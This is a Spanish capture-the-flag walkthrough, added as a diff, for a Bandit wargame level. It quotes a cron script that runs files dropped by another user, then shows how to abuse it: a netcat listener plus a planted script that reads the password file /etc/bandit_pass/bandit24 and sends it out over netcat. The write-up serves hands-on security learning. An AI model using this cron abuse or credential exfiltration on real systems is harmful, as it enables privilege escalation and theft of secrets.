@@ -1,0 +1,40 @@
+Crontab ejecuta un script cada minuto, el cual ejecuta todo script 
+dentro del directorio "/var/spool/bandit24/foo". El codigo es el 
+siguiente:
+
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname/foo
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+Sabiendo que la contraseña de bandit24 se encuentra en el archivo 
+"/etc/bandit_pass/bandit24" y que "bandit24" tiene permisos sobre el 
+archivo se puede ejecutar crear un script que copie el contenido el 
+archivo y lo escriba en un archivo que bandit23 pueda leer. 
+
+Para enviarlo, una alternativa es hacer uso de netcat, poniendo un 
+puerto a la escucha en segundo plano y creando un script que envie el 
+contenido del archivo al puerto en escucha.
+
+#El puerto en escucha:
+nc -l 5006 > test2 &
+
+#El script a ejecutar:
+#!/bin/bash
+
+nc localhost 5006 < /etc/bandit_pass/bandit24
+
